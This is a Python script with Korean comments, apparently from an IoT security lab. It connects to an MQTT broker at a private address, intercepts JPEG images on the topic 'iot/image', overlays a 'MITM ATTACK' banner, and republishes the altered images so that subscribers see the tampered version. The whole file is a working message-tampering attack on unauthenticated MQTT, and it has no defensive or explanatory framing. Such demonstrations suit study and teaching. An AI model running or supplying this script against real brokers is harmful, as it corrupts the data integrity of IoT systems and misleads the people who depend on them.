import paho.mqtt.client as mqtt
from PIL import Image, ImageDraw, ImageFont
import io
from datetime import datetime

BROKER = "192.168.100.133"
PORT = 1883
TOPIC = "iot/image"

# 무한 루프 방지를 위한 간단한 플래그 (실제 공격에선 메시지 해시 비교 등을 사용)
last_processed_time = 0

def on_connect(client, userdata, flags, rc):
    client.subscribe(TOPIC)
    print(f"[+] MITM Interceptor Ready on {TOPIC}")

def on_message(client, userdata, msg):
    global last_processed_time
    
    # 너무 빠른 연속 처리는 루프일 가능성이 높음 (간단한 방어 로직)
    current_time = datetime.now().timestamp()
    if current_time - last_processed_time < 0.5:
        return
        
    try:
        # 이미 변조된 메시지인지 확인하는 로직이 있으면 좋음 (생략)
        
        img = Image.open(io.BytesIO(msg.payload))
        # 이미지가 이미 변조되었는지 픽셀 체크 등으로 확인 가능하나 여기선 생략
        
        draw = ImageDraw.Draw(img)
        timestamp = datetime.now().strftime("%H:%M:%S")

        # 대형 악성 워터마크 추가
        draw.rectangle([0, 0, 400, 120], fill=(0, 0, 0)) # 검은 박스
        
        try:
             # 폰트 로드 시도
            font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 30)
            font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
        except:
            font_large = ImageFont.load_default()
            font_small = ImageFont.load_default()

        draw.text((10, 10), "MITM ATTACK", fill=(255, 0, 0), font=font_large)
        draw.text((10, 50), f"Hijacked: {timestamp}", fill=(255, 255, 255), font=font_small)
        draw.text((10, 70), "Original message modified", fill=(255, 0, 0), font=font_small)
        draw.text((10, 90), "Data integrity compromised", fill=(255, 0, 0), font=font_small)
        
        output = io.BytesIO()
        img.save(output, format='JPEG')
        manipulated_img = output.getvalue()
        
        print(f"[*] MITM: 메시지 가로채기 성공! (원본: {len(msg.payload)} bytes)")
        print("[*] MITM: 변조된 메시지 재전송 중...")
        
        last_processed_time = current_time
        # 동일 토픽에 재발행 (Subscriber 화면을 덮어씀)
        client.publish(TOPIC, manipulated_img)
        print("[+] MITM: 변조된 메시지 재전송 완료")

    except Exception as e:
        # 이미지가 아닌 데이터일 경우 패스
        pass

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect(BROKER, PORT, 60)
client.loop_forever()
